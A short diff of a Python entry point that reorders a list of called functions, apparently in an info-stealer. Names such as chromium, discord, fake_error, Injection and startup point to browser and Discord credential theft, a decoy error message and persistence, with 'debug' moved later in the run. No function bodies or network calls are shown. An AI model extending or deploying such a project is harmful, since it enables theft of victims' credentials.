@@ -10,13 +10,13 @@ from config import __CONFIG__
 
 def main():
     funcs = [
-        debug,
         chromium,
         discord,
         fake_error,
         Injection,
         exec_time,
         startup,
+        debug,
         SystemInfo,
     ]
 
